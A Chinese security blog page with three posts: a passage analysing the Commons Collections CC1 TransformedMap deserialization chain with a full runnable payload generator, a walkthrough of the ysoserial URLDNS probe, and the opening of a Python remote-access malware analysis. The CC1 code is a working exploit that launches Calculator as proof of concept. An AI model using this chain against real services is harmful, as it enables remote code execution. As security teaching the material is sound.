<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">    <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;</span><br><span class="line">  )</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过反射创建AnnotationInvocationHandler</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">exp</span> <span class="operator">=</span> declaredConstructor.newInstance(Retention.class, transformedMap);</span><br><span class="line"></span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">oos.writeObject(exp);</span><br><span class="line">oos.close();</span><br></pre></td></tr></table></figure>

<p>但是当我们运行后就会发现报错了，这个是因为将对象序列化时需要序列化的对象是必须要实现Serializable接口的，而Runtime这个类它并没有实现这个接口。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021113018711.png" alt="图片"></p>
<p>那么解决这个问题的办法呢就是将前边的Transformer改造为使用反射的方式进行获取Runtime这个对象。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这是通过反射获取Runtime</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> Runtime.class.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) getRuntimeMethod.invoke(<span class="literal">null</span>);</span><br><span class="line">runtime.exec(<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 改造成对应的Transformer</span></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">    <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">  ),</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">    <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">  ),</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">    <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;</span><br><span class="line">  )</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>最后完整的生成代码如下:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1TransformedMap</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">annotationInvocationHandlerClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerDeclaredConstructor</span> <span class="operator">=</span> annotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationInvocationHandlerDeclaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">exp</span> <span class="operator">=</span> annotationInvocationHandlerDeclaredConstructor.newInstance(Retention.class, transformedMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(exp);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021113056695.png" alt="图片"></p>
<h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><p>Jdk在8u71以后修改了sun.reflect.annotation.AnnotationInvocationHandler 的readObject函数导致在高版本Java中不可用。</p>
<p>致谢</p>
<p>本文的代码和分析过程均参考p牛的《Java安全名漫谈》实现: <a target="_blank" rel="noopener" href="https://github.com/phith0n/JavaThings%EF%BC%8C%E9%9D%9E%E5%B8%B8%E6%84%9F%E8%B0%A2%EF%BC%81">https://github.com/phith0n/JavaThings，非常感谢！</a></p>

      
	</div>

<div class="meta">
	
</div>
</article>

  <article class="post">
	<h2 class="title">
		<a href="2022/10/09/Java安全-URLDNS反序列探测/">Java安全-URLDNS反序列探测</a>
	</h2>
    <div class="entry-content">
    <div class="meta">
      <div class="date">发布时间: <time datetime="2022-10-09T14:03:21.000Z" itemprop="datePublished">2022-03-9</time>
</div>
      <div class="tags">标签: 

<a href="/tags/Java安全/">Java安全</a>
</div>
    </div>
      
        <h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>URLDNS常用于探测目标是否存在反序列化，本篇结合ysoserial工具分析探测的原理。</p>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>借助ysoserial工具可以生成对应的payload</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-all.jar URLDNS <span class="string">&quot;dnslog-url&quot;</span> &gt; /tmp/urldns.bin</span><br></pre></td></tr></table></figure>

<p>下边是模拟存在反序列化问题的代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;/tmp/urldns.bin&quot;</span>);</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">objectInputStream.readObject();</span><br></pre></td></tr></table></figure>

<p>当目标服务器读取序列化的流并调用readObject进行对象还原，那么就将触发DNSLog的回显，由此可以来判断目标是否可能存在反序列化漏洞。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E6%8E%A2%E6%B5%8B/640.png" alt="图片"></p>
<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>这里我们来看一下ysoserial工具的实现代码</p>
<p><a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial/blob/2874a69f6127fd3b3f078461741910423a6b1376/src/main/java/ysoserial/payloads/URLDNS.java">https://github.com/frohoff/ysoserial/blob/2874a69f6127fd3b3f078461741910423a6b1376/src/main/java/ysoserial/payloads/URLDNS.java</a></p>
<p>从源码中可以看到，最终序列化的是一个ht实例也就是HashMap，并且这个HashMap中put了一个元素为u，u的话这里是URL的类实例。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E6%8E%A2%E6%B5%8B/640-20221009214841252.png" alt="图片"></p>
<p>那么我们根据上边的已知道的信息，我们来看一下HashMap的readObject函数，因为在URLDNS这个payload里序列化出来的类型是HashMap，在反序列化时调用的readObject就是HashMap的readObject。</p>
<p>这里我把readObject一些代码删除了，并在注释里写了一些代码的解释。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream s)</span></span><br><span class="line">  <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 上边有一堆代码，主要是做一些初始化和计算字段之类的。</span></span><br><span class="line">  ......</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里只要你有往map里put元素，mappings就不会为0。</span></span><br><span class="line">    <span class="comment">// mappings就相当于映射的键值对表</span></span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> + mappings);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mappings == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="comment">// use defaults</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 一些计算</span></span><br><span class="line">      ......</span><br><span class="line"></span><br><span class="line">        SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);</span><br><span class="line">      <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">      Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>[cap];</span><br><span class="line">      table = tab;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 遍历map的键值对</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">        <span class="comment">// 注意这里这个hash(key)</span></span><br><span class="line">        putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们把这个 <code>hash(key)</code>暂开来说，这个key是什么呢，举个例子: <code>map.put(&quot;a&quot;,123);</code>，那么这个key就是 <code>a</code>。所以我们这里结合上下文，ysoserial在put时是URL的一个实例也就是u。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E6%8E%A2%E6%B5%8B/640-20221009215025366.png" alt="图片"></p>
<p>然后我们再跟进<code>hash()</code>这个函数，hash里就判断key是否为空，不为空的话又调用了key的<code>hashCode()</code>，那么此时我们知道key实际上就是URL这个类型，那么我们继续跟进到URL这个类看看他的hashCode是如何实现的。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">      <span class="type">int</span> h;</span><br><span class="line">      <span class="comment">// 三元运算符，key为null时返回0，不为null时调用key的hashCode函数。</span></span><br><span class="line">      <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进到URL的hashCode函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public synchronized int hashCode() &#123;</span><br><span class="line">      // hashCode 不等于 -1 就直接返回hashCode</span><br><span class="line">      if (hashCode != -1)</span><br><span class="line">          return hashCode;</span><br><span class="line">      </span><br><span class="line">      // 否则就调用handler的hashCode函数</span><br><span class="line">      // 这里的this其实就是上一段代码中的key，也就是URL这个类的实例本身。</span><br><span class="line">      hashCode = handler.hashCode(this);</span><br><span class="line">      return hashCode;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>那么这里又多了一个handler，我们在URL这个类的上下文找一下这个handler是什么。可以看到handler是一个URLStreamHandler的类型，因为上边调用了handler的hashCode函数，所以我们这里继续跟进到hashCode里。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E6%8E%A2%E6%B5%8B/640-20221009214841218.png" alt="图片"></p>
<p>可以看到在URLStreamHandler的hashCode函数里有接收一个参数URL，这个URL我在前边的代码注释中解释过了，他就是最开始HashMap那里put的那个URL实例也就是<code>u</code>。接着我们看到将u传给了函数<code>getHostAddress</code>。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E6%8E%A2%E6%B5%8B/640-20221009214841199.png" alt="图片"></p>
<p>继续跟进看一下getHostAddress函数的逻辑，</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这里调用另外一个函数，继续跟进。</span></span><br><span class="line"><span class="keyword">protected</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> u.getHostAddress();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里又跳回到了java.net.URL这个类的getHostAddress。这里这个host是什么呢，其实这里大家可以自己创建一个URL实例，然后调用一下URL的getHostAddress函数，就能知道是什么了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (hostAddress != <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> hostAddress;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (host == <span class="literal">null</span> || host.isEmpty()) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">      hostAddress = InetAddress.getByName(host);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (UnknownHostException | SecurityException ex) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> hostAddress;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我debug了一下，其实这个host就是我们在使用ysoserial时对应的dnslog的地址。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E6%8E%A2%E6%B5%8B/640-20221009215113785.png" alt="图片"></p>
<p>接着上边的代码将host传给了<code>InetAddress.getByName()</code>，这个函数呢其实就是Java里用来做dns解析的一个函数。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E6%8E%A2%E6%B5%8B/640-20221009215117894.png" alt="图片"></p>
<p>那么到这里，就应该基本清楚了，也就是最开始是HashMap#put了一个元素为URL，然后这个URL实例最终调用了自身的getHostAddress函数，进行了dns解析，所以在dnslog平台上有相应的解析记录。</p>
<ul>
<li><p>所以整个调用链过程如下</p>
</li>
<li><ul>
<li>HashMap -&gt; readObject()</li>
<li>HashMap -&gt; hash()</li>
<li>URL -&gt; hashCode()</li>
<li>URLStreamHandler -&gt; hashCode()</li>
<li>URLStreamHandler -&gt; getHostAddress()</li>
<li>InetAddress-&gt;getByName()</li>
</ul>
</li>
</ul>
<h1 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h1><p>在前边URL这个类的hashCode函数里实际上是有一个判断的，也就是hashCode不等于-1的话就会直接返回，那么就无法进入到后续的handler的hashCode了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="comment">// hashCode 不等于 -1 就直接返回hashCode</span></span><br><span class="line">  <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 否则就调用handler的hashCode函数</span></span><br><span class="line">  <span class="comment">// 这里的this其实就是上一段代码中的key，也就是URL这个类的实例本身。</span></span><br><span class="line">  hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">  <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们查看ysoserial的代码可以看到，ysoserial通过反射将hashCode设置为了-1。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E6%8E%A2%E6%B5%8B/640-20221009214841245.png" alt="图片"></p>

      
	</div>

<div class="meta">
	
</div>
</article>

  <article class="post">
	<h2 class="title">
		<a href="2022/08/21/样本分析-Python远控样本/">样本分析-Python远控样本</a>
	</h2>
    <div class="entry-content">
    <div class="meta">
      <div class="date">发布时间: <time datetime="2022-08-21T14:04:21.000Z" itemprop="datePublished">2022-04-21</time>
</div>
      <div class="tags">标签: 

<a href="/tags/样本分析/">样本分析</a>
</div>
    </div>
      
        <p>Python远控样本分析案例，主要任务是提取C2地址，因为样本存在检测沙箱和虚拟机，在没有真机的情况下需进行手动分析获取对应地址。</p>
<p>获取C2地址直接通过抓取流量也是可以的，本文主要还是分享一下实操的过程和经验。</p>
<p>录屏: <a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1pN4y157F8/">https://www.bilibili.com/video/BV1pN4y157F8/</a> 素材: <a target="_blank" rel="noopener" href="https://github.com/MaskCyberSecurityTeam/TechniqueShare">https://github.com/MaskCyberSecurityTeam/TechniqueShare</a></p>
<h1 id="样本类型判断"><a href="#样本类型判断" class="headerlink" title="样本类型判断"></a>样本类型判断</h1><p>通过查看样本字符串，含有python34.dll相关字符串，python编译为exe的话常用的pyinstaller。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings xxx.exe</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-Python%E8%BF%9C%E6%8E%A7%E6%A0%B7%E6%9C%AC/640-20220821220700531.png" alt="图片"></p>
